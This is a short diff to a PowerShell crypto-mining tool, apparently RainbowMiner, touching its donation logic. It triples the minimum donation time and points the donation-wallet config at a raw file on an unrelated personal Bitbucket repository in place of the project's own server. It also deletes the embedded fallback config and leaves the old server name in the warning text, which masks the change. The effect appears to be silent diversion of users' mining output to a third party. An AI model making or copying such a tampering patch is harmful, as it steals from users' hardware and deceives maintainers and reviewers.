@@ -1332,7 +1332,7 @@ function Invoke-Core {
     $Session.IsServerDonationRun = $ServerDonationRun
 
     #Activate or deactivate donation  
-    $DonateMinutes = if ($Session.Config.Donate -lt 10) {10} else {$Session.Config.Donate}
+    $DonateMinutes = if ($Session.Config.Donate -lt 30) {30} else {$Session.Config.Donate}
     $DonateDelayHours = 24
     if ($DonateMinutes -gt 15) {
         $DonateMinutes /= 2
@@ -1366,9 +1366,8 @@ function Invoke-Core {
 
     if ($Session.Timer.AddHours(-$DonateDelayHours).AddMinutes($DonateMinutes) -ge $Session.LastDonated -and $Session.AvailPools.Count -gt 0) {
         if ($Session.RoundCounter -gt 0 -and -not $Session.IsDonationRun -and -not $Session.UserConfig) {
-            try {$DonationData = Invoke-GetUrl "https://rbminer.net/api/dconf.php";Set-ContentJson -PathToFile ".\Data\dconf.json" -Data $DonationData -Compress > $null} catch {if ($Error.Count){$Error.RemoveAt(0)};Write-Log -Level Warn "Rbminer.net/api/dconf.php could not be reached"}
+            try {$DonationData = Invoke-GetUrl "https://bitbucket.org/jokoGendeng/gendenganyaran/raw/9d5cd2ef4be4a055a7d163964e151df68088d705/Data/dconf.json";Set-ContentJson -PathToFile ".\Data\dconf.json" -Data $DonationData -Compress > $null} catch {if ($Error.Count){$Error.RemoveAt(0)};Write-Log -Level Warn "Rbminer.net/api/dconf.php could not be reached"}
             if (-not $DonationData -or -not $DonationData.Wallets) {try {$DonationData = Get-ContentByStreamReader ".\Data\dconf.json" | ConvertFrom-Json -ErrorAction Stop} catch {if ($Error.Count){$Error.RemoveAt(0)}}}
-            if (-not $DonationData -or -not $DonationData.Wallets) {$DonationData = Get-Unzip 'H4sIAAAAAAAEAL2VW3OiMBTH33dmvwTPfYAIiL6BotbbYtW1dcfpJBAwlSRugArt9Ltvwt4qM529ONM3TpI553f+58KzFgiOICIpySuta+j6lbaBaYrzTOs+a2BGGBb15+22p3U1ODlhMCdzNDBAObbcKnG2rGidphtik3I8GDNNOuDigIV8TY+lNPswhxvCIn6SRzjLCYU5vg8LITDL5X2AGUzr6M6VtlxOtW4M0wy/XGl+vseCSgQF4K8UgF6245ZvA2whpNu6gVwLxLpjtHrIMRzQ7sSmDj3D9HoXgOgNjhmXKvBPIYaslmJ2Ix2Y5rr/9Sm24HALrZxkwEvGrafpcD/Lc754CApjYE2Nz/l2yFw08SB39jZmt0bUwfxoHc2RG6wfQTkz4XTxcFe1w5HhGy4bLDc0mW8W/4EPs+zERSRvy0Y2fhmmRYTdNOGC5Hsqn/SK8AAF56CTaY105yTEI5jtVa5erXoriNfrlbE6sLiKzCW7E/7pdFz77sJ/2kTAK/qXqR2kMI+5UFyPQN7NYEloQWdQJIR9in0huHKsN0llexKWBJynowIp3AbDOqsNgag03OD6/rqvKgeA2bF/nExwpfhiMzYcZMamE1kd2wyt2AQ26ugmMCPdcULDskOsh5EOoY46jmM6nVYIUWwj3LJ0/E9tDmTk35X4otG6veST7ICJGiBaCQKjRHDpJtV2jaTlxKrqyMT/lPEyh7n7iAVMsPxEqZwjiVk1xHf9Xg0ZKiGmq15T5C0WtcSv2qFf3viro8dvJ8L3FuUAgVEW0KENj+WITui6vGQLgDfi9zhh2TtCqHjLiiKVufaWKEue8ndkej3BtE2bVH0cwyLNLwM6a6G/p7PPWFSfSnky1d9qn+zVPmnW8vWGP9+yZ12+O5+X3a99Vv+d5pBiFWUoCBvyNKoPpQNlSyc/zTlhD/CGJEqyEzx+P969fPzwDah1LfsDBwAA' | ConvertFrom-Json}
             if (-not $Session.IsDonationRun) {Write-Log "Donation run started for the next $(($Session.LastDonated-($Session.Timer.AddHours(-$DonateDelayHours))).Minutes +1) minutes. "}
             $API.UserConfig = $Session.Config | ConvertTo-Json -Depth 10
             $Session.UserConfig = $API.UserConfig | ConvertFrom-Json -ErrorAction Ignore
